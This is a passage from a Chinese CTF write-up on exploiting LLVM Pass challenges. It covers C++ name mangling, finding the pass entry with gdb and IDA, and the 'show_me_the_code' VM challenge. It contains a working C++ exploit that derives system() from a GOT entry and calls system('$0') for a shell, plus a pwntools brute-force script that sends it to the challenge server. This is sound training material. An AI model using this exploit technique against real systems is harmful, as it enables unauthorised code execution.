<span class="token parameter variable">-load</span> ./xxx.so -标识符 ./exp.ll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中标识符与加载的动态库中注册的一个<code>pass</code>相关联，可以使用<code>-标识符</code>来启用这个<code>pass</code></p><h3 id="c-函数名修饰规则"><a href="#c-函数名修饰规则" class="headerlink" title="c++函数名修饰规则"></a>c++函数名修饰规则</h3><p>使用<code>gcc</code>或<code>clang</code>编译<code>c++</code>时会经过名称修饰的过程从而改变函数名，修饰后的名称通常包括：</p><ul><li><p><code>_Z</code>：修饰名称的开始</p></li><li><p><code>N</code>：表示这是一个函数或静态成员函数</p></li><li><p>数字：表示函数名称的长度</p></li><li><p>类名和函数名：经过编码的类名和函数名</p></li><li><p><code>E</code>：参数列表的开始</p></li><li><p>参数类型：通过不同的字母按顺序表示参数类型</p><table><thead><tr><th>字母</th><th>参数类型</th></tr></thead><tbody><tr><td>i</td><td>int</td></tr><tr><td>j</td><td>unsigned int</td></tr><tr><td>l</td><td>long</td></tr><tr><td>x</td><td>long long</td></tr><tr><td>m</td><td>unsigned long</td></tr><tr><td>c</td><td>char</td></tr><tr><td>h</td><td>unsigned char</td></tr><tr><td>b</td><td>bool</td></tr></tbody></table></li><li><p>结尾：包含额外信息如返回类型</p></li></ul><p>例如<code>_ZN4edoc4addiEhii</code>表示在<code>edoc</code>类中的函数名长度为<code>4</code>的函数<code>addi</code>，它的三个参数分别是<code>unsigned char</code>、<code>int</code>、<code>int</code>类型</p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h3><p>题目一般会给出<code>ld-linux-x86-64.so.2</code>、<code>libc.so.6</code>、<code>opt-12</code>、<code>xxx.so</code>和一个说明文档，说明文档会给出如何编译运行以及打远程，一般是将<code>.ll</code>或者<code>.bc</code>文件进行<code>base64</code>编码发送到远程，漏洞点出现在<code>xxx.so</code>，即需要逆向分析的就是这个<code>xxx.so</code>，而攻击的是<code>opt</code>程序，<code>opt</code>程序没给的话也可以用<code>/bin/opt-12</code></p><ul><li><p>在初始化函数(例如<code>_cxx_global_var_init_17</code>)中找到标识符（即<code>StringRef</code>函数的参数)</p></li><li><p>导入动态链接库<code>sudo cp xxx.so /lib</code></p></li><li><p>在<code>xxx.so</code>的<code>.data.rel.ro</code>段找到虚表，虚表的最后一项就是程序入口</p></li><li><p>进行动态调试，确定入口函数名、其他函数名、类名等</p></li><li><p>编写交互脚本</p></li><li><p>逆向分析函数，编写<code>exp</code>脚本</p></li></ul><h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>使用<code>gdb opt-12</code>进行调试，并且通过<code>set args -load ./xxx.so -xxx ./exp.ll</code>导入参数，在<code>main</code>函数下断点，运行至所有<code>llvm::initialize</code>前缀的初始化函数结束，使用<code>vmmap</code>获取<code>xxx.so</code>的基址，通过<code>IDA</code>中的偏移下断点进行进一步调试（如果没有基址说明初始胡函数还没运行完</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="show-me-the-code"><a href="#show-me-the-code" class="headerlink" title="show_me_the_code"></a>show_me_the_code</h3><p>题目来源于源鲁杯<code>Round3</code>的困难题，给了<code>codeVM.so</code>、<code>ld-linux-x86-64.so.2</code>、<code>libc.so.6</code>、<code>opt-12</code>、说明文档和<code>docker</code>，给出编译指令<code>clang-12 -emit-llvm -S exp.cpp -o exp.ll</code>，上传题解的方式是将<code>exp.ll</code>进行<code>base64</code>编码并且在最后加上换行和<code>EOF</code>发送到远程，从编译指令可以看出需要用<code>c++</code>编写<code>exp</code></p><h4 id="确定标识符"><a href="#确定标识符" class="headerlink" title="确定标识符"></a>确定标识符</h4><p>直接搜索函数名<code>init</code>找到函数<code>_cxx_global_var_init_17</code>中有标识符<code>Co00o0oOd3</code>，确定了程序的运行方式是<code>./opt-12 -load ./codeVM.so -Co00o0oOd3 ./exp.ll</code>，这里需要先执行<code>sudo cp codeVM.so /lib</code>导入动态链接库</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">_cxx_global_var_init_17</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h] BYREF</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-18h]</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-10h] BYREF</span>  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>  llvm<span class="token operator">::</span>StringRef<span class="token operator">::</span><span class="token function">StringRef</span><span class="token punctuation">(</span><span class="token punctuation">(</span>llvm<span class="token operator">::</span>StringRef <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> <span class="token string">"Co00o0oOd3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  llvm<span class="token operator">::</span>StringRef<span class="token operator">::</span><span class="token function">StringRef</span><span class="token punctuation">(</span><span class="token punctuation">(</span>llvm<span class="token operator">::</span>StringRef <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">,</span> <span class="token string">"c0oo0o0Ode Pass"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  llvm<span class="token operator">::</span>RegisterPass<span class="token operator">&lt;</span>`anonymous namespace'<span class="token operator">::</span>c0oo0o0Ode<span class="token operator">></span><span class="token operator">::</span><span class="token function">RegisterPass</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>X<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v4<span class="token punctuation">,</span> v1<span class="token punctuation">,</span> v2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__cxa_atexit</span><span class="token punctuation">(</span>llvm<span class="token operator">::</span>RegisterPass<span class="token operator">&lt;</span>`anonymous namespace'<span class="token operator">::</span>c0oo0o0Ode<span class="token operator">></span><span class="token operator">::</span><span class="token operator">~</span>RegisterPass<span class="token punctuation">,</span> <span class="token operator">&amp;</span>X<span class="token punctuation">,</span> <span class="token operator">&amp;</span>_dso_handle<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="确定程序入口函数"><a href="#确定程序入口函数" class="headerlink" title="确定程序入口函数"></a>确定程序入口函数</h4><p>在<code>.data.rel.ro</code>段找到了<code>vtable</code>，最后一项&#96;&#96;anonymous namespace’::c0oo0o0Ode::runOnFunction(llvm::Function &amp;)&#96;就是程序入口，直接点进这个函数</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.data.rel.ro:0000000000030D08                 dq offset _ZN12_GLOBAL__N_110c0oo0o0OdeD2Ev ; &#96;anonymous namespace&#39;::c0oo0o0Ode::~c0oo0o0Ode().data.rel.ro:0000000000030D10                 dq offset _ZN12_GLOBAL__N_110c0oo0o0OdeD0Ev ; &#96;anonymous namespace&#39;::c0oo0o0Ode::~c0oo0o0Ode().data.rel.ro:0000000000030D18                 dq offset _ZNK4llvm4Pass11getPassNameEv ; llvm::Pass::getPassName(void).data.rel.ro:0000000000030D20                 dq offset _ZN4llvm4Pass16doInitializationERNS_6ModuleE ; llvm::Pass::doInitialization(llvm::Module &amp;).data.rel.ro:0000000000030D28                 dq offset _ZN4llvm4Pass14doFinalizationERNS_6ModuleE ; llvm::Pass::doFinalization(llvm::Module &amp;).data.rel.ro:0000000000030D30                 dq offset _ZNK4llvm4Pass5printERNS_11raw_ostreamEPKNS_6ModuleE ; llvm::Pass::print(llvm::raw_ostream &amp;,llvm::Module const*).data.rel.ro:0000000000030D38                 dq offset _ZNK4llvm12FunctionPass17createPrinterPassERNS_11raw_ostreamERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE ; llvm::FunctionPass::createPrinterPass(llvm::raw_ostream &amp;,std::string const&amp;).data.rel.ro:0000000000030D40                 dq offset _ZN4llvm12FunctionPass17assignPassManagerERNS_7PMStackENS_15PassManagerTypeE ; llvm::FunctionPass::assignPassManager(llvm::PMStack &amp;,llvm::PassManagerType).data.rel.ro:0000000000030D48                 dq offset _ZN4llvm4Pass18preparePassManagerERNS_7PMStackE ; llvm::Pass::preparePassManager(llvm::PMStack &amp;).data.rel.ro:0000000000030D50                 dq offset _ZNK4llvm12FunctionPass27getPotentialPassManagerTypeEv ; llvm::FunctionPass::getPotentialPassManagerType(void).data.rel.ro:0000000000030D58                 dq offset _ZNK4llvm4Pass16getAnalysisUsageERNS_13AnalysisUsageE ; llvm::Pass::getAnalysisUsage(llvm::AnalysisUsage &amp;).data.rel.ro:0000000000030D60                 dq offset _ZN4llvm4Pass13releaseMemoryEv ; llvm::Pass::releaseMemory(void).data.rel.ro:0000000000030D68                 dq offset _ZN4llvm4Pass26getAdjustedAnalysisPointerEPKv ; llvm::Pass::getAdjustedAnalysisPointer(void const*).data.rel.ro:0000000000030D70                 dq offset _ZN4llvm4Pass18getAsImmutablePassEv ; llvm::Pass::getAsImmutablePass(void).data.rel.ro:0000000000030D78                 dq offset _ZN4llvm4Pass18getAsPMDataManagerEv ; llvm::Pass::getAsPMDataManager(void).data.rel.ro:0000000000030D80                 dq offset _ZNK4llvm4Pass14verifyAnalysisEv ; llvm::Pass::verifyAnalysis(void).data.rel.ro:0000000000030D88                 dq offset _ZN4llvm4Pass17dumpPassStructureEj ; llvm::Pass::dumpPassStructure(uint).data.rel.ro:0000000000030D90                 dq offset _ZN12_GLOBAL__N_110c0oo0o0Ode13runOnFunctionERN4llvm8FunctionE ; &#96;anonymous namespace&#39;::c0oo0o0Ode::runOnFunction(llvm::Function &amp;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="确定函数名和类名编写交互脚本"><a href="#确定函数名和类名编写交互脚本" class="headerlink" title="确定函数名和类名编写交互脚本"></a>确定函数名和类名编写交互脚本</h4><p>找到程序逻辑，其中<code>llvm::Value::getName</code>用于获取函数名，<code>llvm::operator==(Name, v8, v6[0], v6[1]);</code>用于比较函数名</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">__int64 __fastcall &#96;anonymous namespace&#39;::c0oo0o0Ode::runOnFunction(        _anonymous_namespace_::c0oo0o0Ode *this,        llvm::Function *a2)&#123;  __int64 v2; &#x2F;&#x2F; rdx  char v4; &#x2F;&#x2F; [rsp+Fh] [rbp-51h]  _BYTE v5[32]; &#x2F;&#x2F; [rsp+10h] [rbp-50h] BYREF  __int64 v6[2]; &#x2F;&#x2F; [rsp+30h] [rbp-30h] BYREF  __int64 Name; &#x2F;&#x2F; [rsp+40h] [rbp-20h]  __int64 v8; &#x2F;&#x2F; [rsp+48h] [rbp-18h]  llvm::Value *v9; &#x2F;&#x2F; [rsp+50h] [rbp-10h]  _anonymous_namespace_::c0oo0o0Ode *v10; &#x2F;&#x2F; [rsp+58h] [rbp-8h]  v10 &#x3D; this;  v9 &#x3D; a2;  secret::init(this);  Name &#x3D; llvm::Value::getName(a2);  v8 &#x3D; v2;  VMDatProt::getStrFromProt2(    (__int64)v5,    (__int64)&amp;&#96;anonymous namespace&#39;::vmFuncName[abi:cxx11],    (__int64)&amp;secret::vmKey[abi:cxx11]);  llvm::StringRef::StringRef(v6, v5);  v4 &#x3D; llvm::operator&#x3D;&#x3D;(Name, v8, v6[0], v6[1]);  std::string::~string(v5);  if ( (v4 &amp; 1) !&#x3D; 0 )    &#96;anonymous namespace&#39;::c0oo0o0Ode::vmRun(this, v9);  return 0LL;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接随便写一个函数名动态调试，传入参数的指令是<code>set args -load codeVM.so -Co00o0oOd3 exp.ll -f</code>，运行完初始化函数之后通过<code>vmmap</code>找到<code>codeVM.so</code>的基址</p><pre class="line-numbers language-none"><code class="language-none">0x7ffff1f88000     0x7ffff1fa0000 r--p    18000      0 &#x2F;usr&#x2F;lib&#x2F;codeVM.so   0x7ffff1fa0000     0x7ffff1fb0000 r-xp    10000  18000 &#x2F;usr&#x2F;lib&#x2F;codeVM.so   0x7ffff1fb0000     0x7ffff1fb8000 r--p     8000  28000 &#x2F;usr&#x2F;lib&#x2F;codeVM.so   0x7ffff1fb8000     0x7ffff1fb9000 r--p     1000  2f000 &#x2F;usr&#x2F;lib&#x2F;codeVM.so   0x7ffff1fb9000     0x7ffff1fbb000 rw-p     2000  30000 &#x2F;usr&#x2F;lib&#x2F;codeVM.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>llvm::operator==(Name, v8, v6[0], v6[1]);</code>下断点观察函数名，测试程序中我的函数名是<code>testname</code>，在比较时输入的函数名变成了<code>_Z8testnamev</code>，即头部+长度+函数名+<code>v</code>，比较对象函数名<code>_Z10c0deVmMainv</code>，所以入口函数的函数名就是<code>c0deVmMain</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">► 0x7ffff1fa3242 &lt;(anonymous namespace)::c0oo0o0Ode::runOnFunction(llvm::Function&amp;)+98&gt;     call   llvm::operator&#x3D;&#x3D;(llvm::StringRef, llvm::StringRef)@plt                &lt;llvm::operator&#x3D;&#x3D;(llvm::StringRef, llvm::StringRef)@plt&gt;        rdi: 0x4e5510 ◂— &#39;_Z8testnamev&#39;        rsi: 0xc        rdx: 0x7fffffffd390 ◂— &#39;_Z10c0deVmMainv&#39;        rcx: 0xf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序的基本结构如下，其他操作都写在<code>c0deVmMain</code>中</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int c0deVmMain() &#123;        return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>通过比较之后会进入&#96;&#96;anonymous namespace’::c0oo0o0Ode::vmRun(this, v9);<code>，这个函数中存在</code>8<code>个</code>op<code>，在每个</code>op<code>之前通过</code>anonymous namespace’::c0oo0o0Ode::isValidOp(this, &amp;v15, v6) &amp; 1) !&#x3D; 0<code>判定函数名是否符合，同样函数中存在</code>llvm::Value::getName(v12)<code>和</code>llvm::operator&#x3D;&#x3D;(Name, v11, v9[0], v9[1], v4, v5);&#96;，也是任意写一个函数定位到这里判断函数名</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">__int64 __fastcall &#96;anonymous namespace&#39;::c0oo0o0Ode::isValidOp(__int64 a1, __int64 a2, __int64 a3)&#123;  __int64 v3; &#x2F;&#x2F; rdx  __int64 v4; &#x2F;&#x2F; r8  __int64 v5; &#x2F;&#x2F; r9  char v7; &#x2F;&#x2F; [rsp+Fh] [rbp-81h]  _BYTE v8[32]; &#x2F;&#x2F; [rsp+18h] [rbp-78h] BYREF  __int64 v9[2]; &#x2F;&#x2F; [rsp+38h] [rbp-58h] BYREF  __int64 Name; &#x2F;&#x2F; [rsp+48h] [rbp-48h]  __int64 v11; &#x2F;&#x2F; [rsp+50h] [rbp-40h]  llvm::Value *v12; &#x2F;&#x2F; [rsp+58h] [rbp-38h]  __int64 CalledOperand; &#x2F;&#x2F; [rsp+60h] [rbp-30h]  llvm::CallBase *v14; &#x2F;&#x2F; [rsp+68h] [rbp-28h]  __int64 v15; &#x2F;&#x2F; [rsp+70h] [rbp-20h]  __int64 v16; &#x2F;&#x2F; [rsp+78h] [rbp-18h]  __int64 v17; &#x2F;&#x2F; [rsp+80h] [rbp-10h]  char v18; &#x2F;&#x2F; [rsp+8Fh] [rbp-1h]  v17 &#x3D; a1;  v16 &#x3D; a2;  v15 &#x3D; a3;  v14 &#x3D; (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,false,false,void&gt;,false,true&gt;&gt;(a2);  if ( !v14 )    goto LABEL_6;  CalledOperand &#x3D; llvm::CallBase::getCalledOperand(v14);  v12 &#x3D; (llvm::Value *)llvm::dyn_cast&lt;llvm::Function,llvm::Value&gt;(CalledOperand);  if ( !v12 )    goto LABEL_6;  Name &#x3D; llvm::Value::getName(v12);  v11 &#x3D; v3;  VMDatProt::getStrFromProt2((__int64)v8, v15, (__int64)&amp;secret::vmKey[abi:cxx11]);  llvm::StringRef::StringRef(v9, (__int64)v8);  v7 &#x3D; llvm::operator&#x3D;&#x3D;(Name, v11, v9[0], v9[1], v4, v5);  std::string::~string(v8);  if ( (v7 &amp; 1) !&#x3D; 0 &amp;&amp; (&#96;anonymous namespace&#39;::c0oo0o0Ode::isValidEnv(a1, v16) &amp; 1) !&#x3D; 0 )    v18 &#x3D; 1;  elseLABEL_6:    v18 &#x3D; 0;  return v18 &amp; 1;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我的测试函数名是<code>testfunction</code>，运行到断点观察输入函数名变成<code>_Z12testfunctionv</code>，而比较函数名<code>_ZN4edoc4addiEhii</code>，根据<code>c++</code>函数名修饰规则可以分析到该函数是位于<code>edoc</code>类下的<code>addi</code>函数，参数类型是<code>unsigned char</code>、<code>int</code>、<code>int</code> </p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">► 0x7ffff1fa362e &lt;(anonymous namespace)::c0oo0o0Ode::isValidOp(llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction, false, false, void&gt;, false, true&gt;&amp;, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;)+158&gt;    call   llvm::operator&#x3D;&#x3D;(llvm::StringRef, llvm::StringRef)@plt                &lt;llvm::operator&#x3D;&#x3D;(llvm::StringRef, llvm::StringRef)@plt&gt;        rdi: 0x4e55e0 ◂— &#39;_Z12testfunctionv&#39;        rsi: 0x11        rdx: 0x4ce0c0 ◂— &#39;_ZN4edoc4addiEhii&#39;        rcx: 0x11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样，运行到每个<code>op</code>前的&#96;&#96;anonymous namespace’::c0oo0o0Ode::isValidOp&#96;函数记录每个函数的函数名，得到以下交互脚本</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class edoc &#123;public:    void addi(unsigned char x, int y, int z) &#123;&#125;      void chgr(unsigned char x, int y) &#123;&#125;                      void sftr(unsigned char x, bool y, unsigned char z) &#123;&#125;           void borr(unsigned char x, unsigned char y, unsigned char z) &#123;&#125;     void movr(unsigned char x, unsigned char y) &#123;&#125;                     void save(unsigned char x, unsigned int  y) &#123;&#125;                  void load(unsigned char x, unsigned int y) &#123;&#125;                  void runc(unsigned char x, unsigned int  y) &#123;&#125;                &#125;;edoc obj;int c0deVmMain() &#123;        return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><p>对每个功能进行逆向分析，分析过程不多描述，分析结果如下：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">addi -&gt; regs[x] &#x3D; y + z                                   ;x &lt;&#x3D; 5chgr -&gt; regs[x] +&#x3D; y                                    ;x &lt;&#x3D; 5                  -0x1000 &lt; y &lt; 0x1000    onetimesftr -&gt; if y &#x3D;&#x3D; 1 : regs[x] &lt;&lt; z, if y &#x3D;&#x3D; 0 : regs[x] &gt;&gt; z      ;x &lt;&#x3D; 5  y &lt; 0x40borr -&gt; regs[x] &#x3D; regs[y] | regs[z]                        ;x &lt;&#x3D; 5  y &lt;&#x3D; 5  z &lt;&#x3D; 5movr -&gt; regs[x] &#x3D; regs[y]                                  ;x &lt; 8  y &lt; 8save -&gt; *(y+regs[6]) &#x3D; regs[x]                             ;x &lt;&#x3D; 5  y &lt;&#x3D; 0x1000     y &amp; 7 &#x3D;&#x3D; 0      regs[6] &amp; 0xFFF &#x3D; 0     regs[7] &#x3D; regs[6] + 0x1000load -&gt; regs[x] &#x3D; *(y+regs[6])                             ;x &lt;&#x3D; 5  y &lt;&#x3D; 0x1000     y &amp; 7 &#x3D;&#x3D; 0      regs[6] &amp; 0xFFF &#x3D; 0     regs[7] &#x3D; regs[6] + 0x1000runc -&gt; *(y+regs[6])(regs[x])                              ;x &lt;&#x3D; 5  y &lt;&#x3D; 0x1000     y &amp; 7 &#x3D;&#x3D; 0      regs[6] &amp; 0xFFF &#x3D; 0     regs[7] &#x3D; regs[6] + 0x1000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用思路就是用<code>op7</code>获取一个<code>libc</code>上的地址，用<code>op8</code>执行<code>system(&#39;$0&#39;)</code>，<code>opt-12</code>程序没有开启<code>pie</code>，所以可以直接获取<code>opt-12</code>中的<code>got</code>表里的<code>libc</code>地址，离<code>system</code>最近的就是<code>0x442ad8</code>中的<code>getenv_got</code>，再通过左移右移或运算得到<code>system</code>地址，本地<code>getenv</code>和<code>system</code>地址如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> x/gx 0x442ad80x442ad8 <span class="token operator">&lt;</span>getenv@got<span class="token punctuation">[</span>plt<span class="token punctuation">]</span><span class="token operator">></span>:0x00007ffff1c44b70pwndbg<span class="token operator">></span> p system<span class="token variable">$1</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token operator">&lt;</span>text variable, no debug info<span class="token operator">></span><span class="token punctuation">&#125;</span> 0x7ffff1c50d70 <span class="token operator">&lt;</span>system<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我的思路是将<code>getenv</code>右移<code>16</code>位再左移<code>16</code>位清空最后两个字节为<code>0x00007ffff1c40000</code>，第五位使用<code>op2</code>来加<code>1</code>为<code>0x00007ffff1c50000</code>，再用<code>op3</code>改末三位为<code>0x00007ffff1c50d70</code>，由于<code>libc</code>只有末三位固定剩下是随机的，所以第四位需要爆破</p><p>exp</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class edoc &#123;public:    void addi(unsigned char x, int y, int z) &#123;&#125;                                     void chgr(unsigned char x, int y) &#123;&#125;    void sftr(unsigned char x, bool y, unsigned char z) &#123;&#125;    void borr(unsigned char x, unsigned char y, unsigned char z) &#123;&#125;     void movr(unsigned char x, unsigned char y) &#123;&#125;     void save(unsigned char x, unsigned int  y) &#123;&#125;     void load(unsigned char x, unsigned int y) &#123;&#125;     void runc(unsigned char x, unsigned int  y) &#123;&#125;  &#125;;edoc obj;void testfunction()&#123;&#125;int c0deVmMain() &#123;        obj.addi(0, 0x442000, 0);        obj.movr(6, 0);        obj.addi(1, 0x443000, 0);        obj.movr(7, 1);&#x2F;&#x2F;regs[7] &#x3D; regs[6] + 0x1000        obj.load(2, 0xad8);    &#x2F;&#x2F;load(0x4420xad8): regs[2] &#x3D; getenv_addr        obj.sftr(2, 0, 16);                             obj.sftr(2, 1, 12);        obj.addi(5, 0x400, 0);        obj.borr(2, 2, 5);        obj.chgr(2, 0xc00);        obj.sftr(2, 1, 4);&#x2F;&#x2F;Sets the lower two bytes to null and increments the third last byte by 1        obj.addi(4, 0xd70, 0);        obj.borr(2, 2, 4);&#x2F;&#x2F;clear and add            obj.addi(4, 0x3024, 0);        obj.save(4, 0x1000);&#x2F;&#x2F;save $0        obj.save(2, 0xb00);&#x2F;&#x2F;save system        obj.runc(1, 0xb00);&#x2F;&#x2F;system(&#39;$0&#39;)        return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>爆破脚本，大概30+次爆破出来的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> base64context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"exp.ll"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p <span class="token operator">+=</span> <span class="token string">b'\nEOF\n'</span>rnd <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">43319</span><span class="token punctuation">)</span>        rnd <span class="token operator">+=</span> <span class="token number">1</span>        li<span class="token punctuation">(</span><span class="token string">'the '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rnd<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' round'</span><span class="token punctuation">)</span>        r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'(EOF to stop):\n'</span><span class="token punctuation">)</span>        r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>        r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'cat flag'</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            s <span class="token operator">=</span> r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">b'YLCTF'</span> <span class="token keyword">in</span> s<span class="token punctuation">:</span>            li<span class="token punctuation">(</span>s<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>    <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>        r<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a href="https://www.z1r0.top/2022/10/28/LLVM-PASS-PWN/">https://www.z1r0.top/2022/10/28/LLVM-PASS-PWN/</a></p>]]></content>
    
    
      
      
